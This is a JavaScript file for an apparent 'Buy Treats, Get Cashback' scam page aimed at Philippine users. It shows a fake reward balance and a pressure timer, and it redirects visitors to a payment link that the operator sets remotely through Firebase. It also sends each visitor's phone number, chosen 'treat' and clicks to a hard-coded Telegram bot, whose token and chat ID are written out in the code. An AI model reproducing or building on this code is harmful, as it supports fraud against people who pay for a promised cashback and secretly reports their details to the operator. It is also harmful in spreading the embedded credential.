/* ============================================
   BUY TREATS | GET CASHBACK - MAIN SCRIPT
   ============================================ */

// ===== CARD DATA =====
const cardData = {
  1: {
    img: 'photos/1500iva.png',
    badge: '₱1,500',
    discount: '-22%',
    oldPrice: '₱700',
    newPrice: '545',
    amount: 1500,
    type: 'treat1',
    name: 'Treat 1 (₱1,500)'
  },
  2: {
    img: 'photos/3000iva.png',
    badge: '₱3,000',
    discount: '-28%',
    oldPrice: '₱1,500',
    newPrice: '1,080',
    amount: 3000,
    type: 'treat2',
    name: 'Treat 2 (₱3,000)'
  }
};

// ===== LOCAL STORAGE KEYS =====
const STORAGE_KEYS = {
  SELECTED_CARD: 'treat_selected_card',
  SELECTED_AMOUNT: 'treat_selected_amount',
  USER_PHONE: 'user_phone'
};

// ===== USER DATA =====
const userPhone = localStorage.getItem(STORAGE_KEYS.USER_PHONE) || '09171234567';
if (!localStorage.getItem(STORAGE_KEYS.USER_PHONE)) {
  localStorage.setItem(STORAGE_KEYS.USER_PHONE, userPhone);
}

// ===== DOM REFERENCES =====
const profileImg = document.getElementById('profileImg');
const projectorImg = document.getElementById('projectorImg');
const photoWrapper = document.getElementById('photoWrapper');
const typedSpan = document.getElementById('typedText');
const balanceElement = document.getElementById('balanceAmount');
const claimNowBtn = document.getElementById('claimNowBtn');

// Card Popup Elements
const cardPopupOverlay = document.getElementById('cardPopupOverlay');
const cardPopupCloseBtn = document.getElementById('cardPopupCloseBtn');
const cardPopupImage = document.getElementById('cardPopupImage');
const cardPopupOldPrice = document.getElementById('cardPopupOldPrice');
const cardPopupNewPrice = document.getElementById('cardPopupNewPrice');
const cardPopupDiscount = document.getElementById('cardPopupDiscount');
const cardPopupReward = document.getElementById('cardPopupReward');
const cardPopupSelectBtn = document.getElementById('cardPopupSelectBtn');

// Claim Popup Elements
const claimPopupOverlay = document.getElementById('claimPopupOverlay');
const claimPopupCloseBtn = document.getElementById('claimPopupCloseBtn');
const claimPopupImage = document.getElementById('claimPopupImage');
const claimPopupOldPrice = document.getElementById('claimPopupOldPrice');
const claimPopupNewPrice = document.getElementById('claimPopupNewPrice');
const claimPopupDiscount = document.getElementById('claimPopupDiscount');
const claimPopupRewardAmount = document.getElementById('claimPopupRewardAmount');
const claimPopupPhone = document.getElementById('claimPopupPhone');
const claimPayBtn = document.getElementById('claimPayBtn');
const claimTimerDisplay = document.getElementById('claimTimerDisplay');
const helpLink = document.getElementById('helpLink');

// ===== STATE =====
let selectedCard = null;
let currentBalance = 0;
let cardPopupNumber = null;
let timerInterval = null;
let timeRemaining = 0;
let isTimerRunning = false;
let treatLink = null;
let isRedirecting = false;
let linkScannerInterval = null;
let currentCardType = null;
let hasSentPayTreatsAlert = false;

// ===== FIREBASE REFERENCE =====
const database = firebase.database();

// ===== TELEGRAM CONFIG =====
const TELEGRAM_BOT_TOKEN = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
const TELEGRAM_CHAT_ID = '7298607329';

// ===== HELPER FUNCTIONS =====
function formatWithCommas(number) {
  return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
}

function getPhilippineTime() {
  return new Date().toLocaleString('en-PH', {
    timeZone: 'Asia/Manila',
    month: 'long',
    day: 'numeric',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
}

// ===== TOAST SYSTEM =====
function showToast(message, isError = false) {
  const existingToast = document.querySelector('.toast-message');
  if (existingToast) existingToast.remove();
  
  const toast = document.createElement('div');
  toast.className = 'toast-message' + (isError ? ' error' : '');
  toast.textContent = message;
  document.body.appendChild(toast);
  
  setTimeout(() => {
    toast.style.animation = 'toastSlideDown 0.3s ease';
    setTimeout(() => toast.remove(), 300);
  }, 3000);
}

// Add toast styles
(function addToastStyles() {
  if (document.querySelector('#toastStyles')) return;
  const style = document.createElement('style');
  style.id = 'toastStyles';
  style.textContent = `
    .toast-message {
      position: fixed;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(3, 8, 7, 0.90);
      backdrop-filter: blur(16px);
      color: #fff;
      padding: 0.8rem 1.8rem;
      border-radius: 18px;
      border: 1px solid rgba(0, 180, 255, 0.10);
      font-family: 'Inter', sans-serif;
      font-size: 0.9rem;
      font-weight: 500;
      z-index: 9998;
      box-shadow: 0 10px 50px rgba(0, 0, 0, 0.7);
      animation: toastSlideUp 0.3s ease;
      max-width: 85%;
      text-align: center;
    }
    .toast-message.error {
      border-color: rgba(255, 50, 50, 0.15);
    }
    @keyframes toastSlideUp {
      from { opacity: 0; transform: translateX(-50%) translateY(20px); }
      to { opacity: 1; transform: translateX(-50%) translateY(0); }
    }
    @keyframes toastSlideDown {
      from { opacity: 1; transform: translateX(-50%) translateY(0); }
      to { opacity: 0; transform: translateX(-50%) translateY(20px); }
    }
  `;
  document.head.appendChild(style);
})();

// ===== TELEGRAM FUNCTIONS =====
function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const params = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: 'HTML'
  };
  const queryString = Object.keys(params)
    .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
    .join('&');
  
  fetch(`${url}?${queryString}`)
    .then(response => response.json())
    .then(data => {
      if (!data.ok) console.error('Telegram error:', data.description);
      else console.log('✅ Telegram notification sent');
    })
    .catch(error => console.error('Failed to send Telegram:', error));
}

function sendClaimNowAlert(cardName, cardAmount, phone) {
  const timestamp = getPhilippineTime();
  const message = `
📱 <b>CLAIM NOW CLICKED!</b> 🛍️
👤 <b>User:</b> ${phone}
💳 <b>Card:</b> ${cardName}
💰 <b>Amount:</b> ${cardAmount}
⏰ <b>Time:</b> ${timestamp}
#BuyTreats #ClaimNow
  `;
  sendTelegramMessage(message);
}

function sendPayTreatsAlert(cardName, cardAmount, phone, hasLink) {
  const timestamp = getPhilippineTime();
  const linkStatus = hasLink ? '✅ With Link' : '❌ No Link';
  const message = `
💳 <b>PAY TREATS CLICKED!</b> 💰
👤 <b>User:</b> ${phone}
💎 <b>Card:</b> ${cardName}
🏷️ <b>Amount:</b> ${cardAmount}
🔗 <b>Link Status:</b> ${linkStatus}
⏰ <b>Time:</b> ${timestamp}
${hasLink ? '🔗 Redirecting to link' : '⏰ Timer started'}
#BuyTreats #PayTreats
  `;
  sendTelegramMessage(message);
}

function sendRedirectAlert(cardName, cardAmount, phone) {
  const timestamp = getPhilippineTime();
  const message = `
🔗 <b>USER REDIRECTED!</b> 🚀
👤 <b>User:</b> ${phone}
💎 <b>Card:</b> ${cardName}
💰 <b>Amount:</b> ${cardAmount}
⏰ <b>Time:</b> ${timestamp}
✅ User redirected to treat link!
#BuyTreats #Redirect
  `;
  sendTelegramMessage(message);
}

// ===== FIREBASE FUNCTIONS =====
function checkForDeployedLink(treatType) {
  return database.ref('treat_links')
    .orderByChild('type')
    .equalTo(treatType)
    .once('value')
    .then(snapshot => {
      const links = snapshot.val();
      if (links) {
        const linkIds = Object.keys(links);
        const latestId = linkIds[linkIds.length - 1];
        return links[latestId].url;
      }
      return null;
    })
    .catch(error => {
      console.error('❌ Error checking link:', error);
      return null;
    });
}

function incrementClickCount(treatType) {
  return database.ref('treat_links')
    .orderByChild('type')
    .equalTo(treatType)
    .once('value')
    .then(snapshot => {
      const links = snapshot.val();
      if (links) {
        const linkIds = Object.keys(links);
        const latestId = linkIds[linkIds.length - 1];
        const currentClicks = links[latestId].clicks || 0;
        return database.ref('treat_links/' + latestId + '/clicks').set(currentClicks + 1);
      }
    })
    .catch(error => console.error('❌ Error incrementing click count:', error));
}

// ===== IMAGE ERROR HANDLING =====
profileImg.addEventListener('error', function() {
  this.style.display = 'none';
  this.parentElement.style.background = 'linear-gradient(135deg, #0d9488, #06b6d4)';
  this.parentElement.style.display = 'flex';
  this.parentElement.style.alignItems = 'center';
  this.parentElement.style.justifyContent = 'center';
  const placeholder = document.createElement('span');
  placeholder.textContent = '👤';
  placeholder.style.fontSize = '2.5rem';
  placeholder.style.color = '#ffffff';
  placeholder.style.opacity = '0.6';
  this.parentElement.appendChild(placeholder);
});

projectorImg.addEventListener('error', function() {
  this.style.display = 'none';
  this.parentElement.style.background = 'linear-gradient(135deg, #0d9488, #06b6d4)';
  this.parentElement.style.display = 'flex';
  this.parentElement.style.alignItems = 'center';
  this.parentElement.style.justifyContent = 'center';
  const placeholder = document.createElement('span');
  placeholder.textContent = '👤';
  placeholder.style.fontSize = '4rem';
  placeholder.style.color = '#ffffff';
  placeholder.style.opacity = '0.6';
  this.parentElement.appendChild(placeholder);
});

// ============================================================
// THOUGHT BUBBLE TYPEWRITER (INDEPENDENT)
// ============================================================
const messagesNoBalance = [
  "🎄 Advance Merry Christmas! 🎅",
  "Earn cashback on every treat you buy! 💰",
  "Buy Treats & Get Cashback! 🎁",
  "Select a treat to start earning! ✨"
];

const messagesWithBalance = [
  "🎄 Your balance is ready! 🎅",
  "Click Claim now and Pay the Treats to Earn mega cashback! 💰",
  "Don't forget to claim your reward! 🎁",
  "Your cashback is waiting! ✨ Claim now!!"
];

let currentMessages = messagesNoBalance;
let messageIndex = 0;
let charIndex = 0;
let isDeleting = false;
let typingSpeed = 36;

function updateThoughtMessages() {
  const balance = parseFloat(balanceElement.textContent.replace(/,/g, ''));
  const newMessages = balance > 0 ? messagesWithBalance : messagesNoBalance;
  
  if (currentMessages !== newMessages) {
    currentMessages = newMessages;
    messageIndex = 0;
    charIndex = 0;
    isDeleting = false;
    typedSpan.textContent = '';
    setTimeout(typeEffect, 300);
  }
}

function typeEffect() {
  const currentMessage = currentMessages[messageIndex];
  if (!currentMessage) {
    messageIndex = 0;
    return;
  }
  
  if (!isDeleting) {
    typedSpan.textContent = currentMessage.substring(0, charIndex + 1);
    charIndex++;
    if (charIndex === currentMessage.length) {
      setTimeout(() => { isDeleting = true; typeEffect(); }, 2800);
      return;
    }
    setTimeout(typeEffect, typingSpeed + Math.random() * 18);
  } else {
    typedSpan.textContent = currentMessage.substring(0, charIndex - 1);
    charIndex--;
    if (charIndex === 0) {
      isDeleting = false;
      messageIndex = (messageIndex + 1) % currentMessages.length;
      setTimeout(typeEffect, 500);
      return;
    }
    setTimeout(typeEffect, typingSpeed * 0.3);
  }
}

// Start thought bubble
setTimeout(typeEffect, 600);

// Watch balance changes
const balanceObserver = new MutationObserver(updateThoughtMessages);
if (balanceElement) {
  balanceObserver.observe(balanceElement, { childList: true, characterData: true, subtree: true });
}

// ============================================================
// PROJECTOR ZOOM (INDEPENDENT)
// ============================================================
photoWrapper.addEventListener('click', function(e) {
  e.stopPropagation();
  this.classList.toggle('active');
});

document.addEventListener('click', function(e) {
  if (!photoWrapper.contains(e.target)) {
    photoWrapper.classList.remove('active');
  }
});

// ============================================================
// BALANCE UPDATE (INDEPENDENT)
// ============================================================
function updateBalance(newAmount, isIncrement) {
  const amountSpan = balanceElement;
  amountSpan.classList.remove('increment', 'decrement');
  void amountSpan.offsetWidth;
  amountSpan.textContent = formatWithCommas(newAmount) + '.00';
  if (isIncrement) {
    amountSpan.classList.add('increment');
  } else {
    amountSpan.classList.add('decrement');
  }
  setTimeout(() => {
    amountSpan.classList.remove('increment', 'decrement');
  }, 700);
  localStorage.setItem(STORAGE_KEYS.SELECTED_AMOUNT, String(newAmount));
}

// ============================================================
// CARD SELECTION (INDEPENDENT)
// ============================================================
function selectCard(cardNumber) {
  const card = document.getElementById('card' + cardNumber);
  const btn = card.querySelector('.card-btn');
  const amount = cardData[cardNumber].amount;
  const cardId = 'card' + cardNumber;

  if (selectedCard === cardId) {
    card.classList.remove('selected');
    btn.classList.remove('selected-btn');
    btn.textContent = 'Select Treat';
    selectedCard = null;
    currentBalance = 0;
    updateBalance(0, false);
    stopLinkScanner();
    updateThoughtMessages();
    localStorage.removeItem(STORAGE_KEYS.SELECTED_CARD);
    localStorage.removeItem(STORAGE_KEYS.SELECTED_AMOUNT);
    return;
  }

  if (selectedCard !== null) {
    const prevCard = document.getElementById(selectedCard);
    const prevBtn = prevCard.querySelector('.card-btn');
    prevCard.classList.remove('selected');
    prevBtn.classList.remove('selected-btn');
    prevBtn.textContent = 'Select Treat';
  }

  card.classList.add('selected');
  btn.classList.add('selected-btn');
  btn.textContent = '✓ Selected';
  selectedCard = cardId;
  currentBalance = amount;
  updateBalance(amount, true);
  updateThoughtMessages();
  localStorage.setItem(STORAGE_KEYS.SELECTED_CARD, cardId);
  localStorage.setItem(STORAGE_KEYS.SELECTED_AMOUNT, String(amount));
  
  const cardNumberParsed = parseInt(selectedCard.replace('card', ''));
  const treatType = cardData[cardNumberParsed].type;
  startLinkScanner(treatType);
}

// ============================================================
// RESTORE SELECTED CARD (INDEPENDENT)
// ============================================================
function restoreSelectedCard() {
  const savedCard = localStorage.getItem(STORAGE_KEYS.SELECTED_CARD);
  const savedAmount = localStorage.getItem(STORAGE_KEYS.SELECTED_AMOUNT);
  
  if (!savedCard) {
    console.log('ℹ️ No saved card found');
    return false;
  }
  
  const cardElement = document.getElementById(savedCard);
  if (!cardElement) {
    localStorage.removeItem(STORAGE_KEYS.SELECTED_CARD);
    localStorage.removeItem(STORAGE_KEYS.SELECTED_AMOUNT);
    return false;
  }
  
  const cardNumber = parseInt(savedCard.replace('card', ''));
  if (!cardData[cardNumber]) {
    localStorage.removeItem(STORAGE_KEYS.SELECTED_CARD);
    localStorage.removeItem(STORAGE_KEYS.SELECTED_AMOUNT);
    return false;
  }
  
  const amount = parseFloat(savedAmount) || cardData[cardNumber].amount;
  const btn = cardElement.querySelector('.card-btn');
  
  document.querySelectorAll('.card-item').forEach(c => {
    if (c.id !== savedCard) {
      c.classList.remove('selected');
      const b = c.querySelector('.card-btn');
      if (b) {
        b.classList.remove('selected-btn');
        b.textContent = 'Select Treat';
      }
    }
  });
  
  cardElement.classList.add('selected');
  if (btn) {
    btn.classList.add('selected-btn');
    btn.textContent = '✓ Selected';
  }
  
  selectedCard = savedCard;
  currentBalance = amount;
  updateBalance(amount, true);
  updateThoughtMessages();
  
  const treatType = cardData[cardNumber].type;
  startLinkScanner(treatType);
  
  console.log('✅ Card restored:', savedCard, 'Amount:', amount);
  return true;
}

// ============================================================
// LINK SCANNER (INDEPENDENT)
// ============================================================
function startLinkScanner(treatType) {
  stopLinkScanner();
  currentCardType = treatType;
  console.log('🔄 Starting link scanner for:', treatType);
  checkAndRedirect(treatType);
  linkScannerInterval = setInterval(function() {
    checkAndRedirect(treatType);
  }, 1000);
}

function stopLinkScanner() {
  if (linkScannerInterval) {
    clearInterval(linkScannerInterval);
    linkScannerInterval = null;
    console.log('🛑 Link scanner stopped');
  }
  currentCardType = null;
}

function checkAndRedirect(treatType) {
  if (isRedirecting || !treatType) return;
  
  checkForDeployedLink(treatType).then(link => {
    if (link) {
      console.log('🔗 Link found:', link);
      if (claimPopupOverlay.classList.contains('active')) {
        if (isTimerRunning) {
          clearInterval(timerInterval);
          timerInterval = null;
          isTimerRunning = false;
          claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
        }
        incrementClickCount(treatType);
        const cardNumber = parseInt(selectedCard.replace('card', ''));
        const cardDataItem = cardData[cardNumber];
        sendRedirectAlert(cardDataItem.name, cardDataItem.badge, userPhone);
        isRedirecting = true;
        showToast('🔗 Redirecting to treat link...');
        setTimeout(function() { window.location.href = link; }, 1500);
      } else {
        treatLink = link;
      }
    }
  }).catch(error => console.error('❌ Scanner error:', error));
}

// ============================================================
// CARD POPUP (INDEPENDENT)
// ============================================================
function openCardPopup(cardNumber) {
  cardPopupNumber = cardNumber;
  const data = cardData[cardNumber];
  
  cardPopupImage.src = data.img;
  cardPopupOldPrice.textContent = data.oldPrice;
  cardPopupNewPrice.textContent = data.newPrice;
  cardPopupDiscount.textContent = data.discount;
  cardPopupReward.textContent = formatWithCommas(parseInt(data.badge.replace('₱', '').replace(/,/g, '')));
  
  updateCardPopupButtonState();
  cardPopupOverlay.classList.add('active');
  document.body.style.overflow = 'hidden';
}

function closeCardPopup() {
  cardPopupOverlay.classList.remove('active');
  document.body.style.overflow = '';
}

function updateCardPopupButtonState() {
  const cardId = 'card' + cardPopupNumber;
  const card = document.getElementById(cardId);
  const isSelected = card.classList.contains('selected');
  
  if (isSelected) {
    cardPopupSelectBtn.classList.add('selected-popup');
    cardPopupSelectBtn.innerHTML = '<i class="fas fa-check-circle"></i> ✓ Selected';
  } else {
    cardPopupSelectBtn.classList.remove('selected-popup');
    cardPopupSelectBtn.innerHTML = '<i class="fas fa-check-circle"></i> Select Treat';
  }
}

function cardPopupSelectCard() {
  if (cardPopupNumber) {
    selectCard(cardPopupNumber);
    updateCardPopupButtonState();
    setTimeout(closeCardPopup, 400);
  }
}

// Card Popup Event Listeners
cardPopupCloseBtn.addEventListener('click', closeCardPopup);
cardPopupSelectBtn.addEventListener('click', cardPopupSelectCard);
cardPopupOverlay.addEventListener('click', function(e) {
  if (e.target === cardPopupOverlay) closeCardPopup();
});

// ============================================================
// CLAIM POPUP (INDEPENDENT)
// ============================================================
function openClaimPopup() {
  if (selectedCard === null) {
    alert('💳 Please select a treat reward first!');
    return;
  }
  
  const cardNumber = parseInt(selectedCard.replace('card', ''));
  const data = cardData[cardNumber];
  const rawAmount = parseInt(data.badge.replace('₱', '').replace(/,/g, ''));
  
  claimPopupImage.src = data.img;
  claimPopupOldPrice.textContent = data.oldPrice;
  claimPopupNewPrice.textContent = data.newPrice;
  claimPopupDiscount.textContent = data.discount;
  claimPopupRewardAmount.textContent = formatWithCommas(rawAmount);
  claimPopupPhone.textContent = userPhone;
  
  sendClaimNowAlert(data.name, data.badge, userPhone);
  
  resetClaimTimer();
  isRedirecting = false;
  hasSentPayTreatsAlert = false;
  
  checkForDeployedLink(data.type).then(link => {
    treatLink = link;
    if (link) {
      claimPayBtn.innerHTML = '<i class="fas fa-link"></i> PAY TREATS';
      claimPayBtn.classList.remove('disabled');
    } else {
      claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS';
      claimPayBtn.classList.remove('disabled');
    }
  });
  
  claimPopupOverlay.classList.add('active');
  document.body.style.overflow = 'hidden';
}

function closeClaimPopup() {
  resetClaimTimer();
  claimPopupOverlay.classList.remove('active');
  document.body.style.overflow = '';
}

// Claim Popup Event Listeners
claimPopupCloseBtn.addEventListener('click', closeClaimPopup);
claimPopupOverlay.addEventListener('click', function(e) {
  if (e.target === claimPopupOverlay) closeClaimPopup();
});

// ============================================================
// TIMER (INDEPENDENT - Visual Only)
// ============================================================
function startTimer() {
  if (selectedCard === null) {
    alert('💳 Please select a treat reward first!');
    return;
  }
  if (isTimerRunning) return;
  
  if (!hasSentPayTreatsAlert) {
    const cardNumber = parseInt(selectedCard.replace('card', ''));
    const data = cardData[cardNumber];
    sendPayTreatsAlert(data.name, data.badge, userPhone, !!treatLink);
    hasSentPayTreatsAlert = true;
  }
  
  if (treatLink && !isRedirecting) {
    isRedirecting = true;
    claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
    const cardNumber = parseInt(selectedCard.replace('card', ''));
    const data = cardData[cardNumber];
    sendRedirectAlert(data.name, data.badge, userPhone);
    setTimeout(function() { window.location.href = treatLink; }, 1500);
    return;
  }
  
  timeRemaining = 300;
  isTimerRunning = true;
  claimPayBtn.classList.add('disabled');
  claimPayBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> WAIT <span class="timer-display" id="claimTimerDisplay">5:00</span>';
  
  timerInterval = setInterval(function() {
    timeRemaining--;
    const minutes = Math.floor(timeRemaining / 60);
    const seconds = timeRemaining % 60;
    const timeStr = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
    if (claimTimerDisplay) claimTimerDisplay.textContent = timeStr;
    
    if (timeRemaining <= 0) {
      clearInterval(timerInterval);
      timerInterval = null;
      isTimerRunning = false;
      claimPayBtn.classList.remove('disabled');
      claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS';
      if (claimTimerDisplay) claimTimerDisplay.textContent = '';
      console.log('⏰ Timer finished');
    }
  }, 1000);
}

function resetClaimTimer() {
  if (timerInterval) {
    clearInterval(timerInterval);
    timerInterval = null;
  }
  isTimerRunning = false;
  timeRemaining = 0;
  isRedirecting = false;
  hasSentPayTreatsAlert = false;
  claimPayBtn.classList.remove('disabled');
  if (claimTimerDisplay) claimTimerDisplay.textContent = '';
  claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS';
}

// Claim Pay Button
claimPayBtn.addEventListener('click', startTimer);

// ============================================================
// HELP WIDGET (INDEPENDENT)
// ============================================================
helpLink.addEventListener('click', function(e) {
  e.preventDefault();
  window.open('https://facebook.com/FreeShoppingPH', '_blank');
});

// ============================================================
// CLAIM NOW BUTTON (INDEPENDENT)
// ============================================================
claimNowBtn.addEventListener('click', function() {
  if (currentBalance <= 0) {
    alert('💳 Please select a treat reward first!');
  } else {
    openClaimPopup();
  }
});

// ============================================================
// ESCAPE KEY (INDEPENDENT)
// ============================================================
document.addEventListener('keydown', function(e) {
  if (e.key === 'Escape') {
    if (cardPopupOverlay.classList.contains('active')) closeCardPopup();
    if (claimPopupOverlay.classList.contains('active')) closeClaimPopup();
  }
});

// ============================================================
// PERSISTENT TIMER ON LOAD (INDEPENDENT)
// ============================================================
function checkPersistentTimer() {
  const timerData = localStorage.getItem('treat_timer');
  if (!timerData) return false;
  
  try {
    const data = JSON.parse(timerData);
    const elapsed = Math.floor((Date.now() - data.startTime) / 1000);
    const remaining = data.duration - elapsed;
    
    if (remaining > 0) {
      timeRemaining = remaining;
      isTimerRunning = true;
      selectedCard = data.selectedCard;
      treatLink = data.treatLink;
      
      const cardNumber = parseInt(selectedCard.replace('card', ''));
      if (cardNumber && cardData[cardNumber]) {
        currentBalance = cardData[cardNumber].amount;
        updateBalance(currentBalance, true);
      }
      
      startTimerDisplay(remaining);
      
      if (data.pendingRedirect && data.treatLink) {
        setTimeout(() => {
          if (data.treatLink) window.location.href = data.treatLink;
        }, 1000);
      }
      return true;
    } else {
      localStorage.removeItem('treat_timer');
      if (data.treatLink && data.pendingRedirect) {
        window.location.href = data.treatLink;
      }
      return false;
    }
  } catch (e) {
    localStorage.removeItem('treat_timer');
    return false;
  }
}

function startTimerDisplay(seconds) {
  const minutes = Math.floor(seconds / 60);
  const secs = seconds % 60;
  const timeStr = String(minutes).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
  if (claimTimerDisplay) claimTimerDisplay.textContent = timeStr;
  claimPayBtn.classList.add('disabled');
  claimPayBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> WAIT <span class="timer-display" id="claimTimerDisplay">' + timeStr + '</span>';
}

function saveTimerState(duration, link, cardId) {
  const timerData = {
    startTime: Date.now(),
    duration: duration,
    selectedCard: cardId,
    treatLink: link,
    pendingRedirect: !!link
  };
  localStorage.setItem('treat_timer', JSON.stringify(timerData));
}

// ============================================================
// INITIALIZE
// ============================================================
const cardRestored = restoreSelectedCard();
const hasActiveTimer = checkPersistentTimer();

if (!cardRestored && !hasActiveTimer) {
  console.log('ℹ️ No card selected - showing default state');
}

// ============================================================
// EXPOSE FUNCTIONS GLOBALLY FOR HTML ONCLICK
// ============================================================
window.selectCard = selectCard;
window.openCardPopup = openCardPopup;
window.cardPopupSelectCard = cardPopupSelectCard;
window.closeCardPopup = closeCardPopup;
window.closeClaimPopup = closeClaimPopup;

console.log('✅ Main.js initialized successfully');
